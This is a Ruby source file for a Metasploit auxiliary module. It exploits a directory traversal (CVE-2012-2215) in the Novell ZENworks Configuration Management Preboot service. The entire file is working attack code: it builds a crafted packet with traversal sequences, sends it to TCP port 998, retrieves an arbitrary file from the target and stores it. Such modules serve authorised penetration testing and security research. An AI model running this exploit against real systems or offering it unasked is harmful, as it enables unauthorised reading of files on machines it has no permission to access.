##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Novell ZENworks Configuration Management Preboot Service Remote File Access',
      'Description'    => %q{
          This module exploits a directory traversal in the ZENworks Configuration Management.
        The vulnerability exists in the Preboot service and can be triggered by sending a specially
        crafted PROXY_CMD_FTP_FILE (opcode 0x21) packet to the 998/TCP port. This module has been
        successfully tested on Novell ZENworks Configuration Management 10 SP2 and SP3 over Windows.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Luigi Auriemma', # Vulnerability Discovery
          'juan vazquez' # Metasploit module
        ],
      'References'     =>
        [
          [ 'CVE', '2012-2215' ],
          [ 'OSVDB', '80230' ],
          [ 'URL', 'http://www.verisigninc.com/en_US/products-and-services/network-intelligence-availability/idefense/public-vulnerability-reports/articles/index.xhtml?id=975' ],
          [ 'URL', 'http://support.novell.com/docs/Readmes/InfoDocument/patchbuilder/readme_5127930.html' ]
        ]
    ))

    register_options(
      [
        Opt::RPORT(998),
        OptString.new('FILEPATH', [true, 'The name of the file to download', '\\WINDOWS\\system32\\drivers\\etc\\hosts']),
        OptInt.new('DEPTH', [true, 'Traversal depth', 6])
      ], self.class)
  end

  def run_host(ip)
    # No point to continue if no filename is specified
    if datastore['FILEPATH'].nil? or datastore['FILEPATH'].empty?
      print_error("Please supply the name of the file you want to download")
      return
    end

    travs = "\\.." * datastore['DEPTH']
    travs << "\\" unless datastore['FILEPATH'][0] == "\\"
    travs << datastore['FILEPATH']

    payload = Rex::Text.to_unicode(travs)
    packet =  [0x21].pack("N") # Opcode
    packet << [payload.length].pack("N") # Length
    packet << payload # Value

    connect
    sock.put(packet)
    sock.get_once(4, 1)
    length = sock.get_once(4, 1)
    sock.get_once(0x210-8, 1)
    contents = sock.get_once(length.unpack("V").first, 1)
    disconnect

    print_status "File retrieved successfully!"
    fname = File.basename(datastore['FILEPATH'])
    path = store_loot(
      'novell.zenworks_configuration_management',
      'application/octet-stream',
      ip,
      contents,
      fname
    )
    print_status("File saved in: #{path}")
  end

end
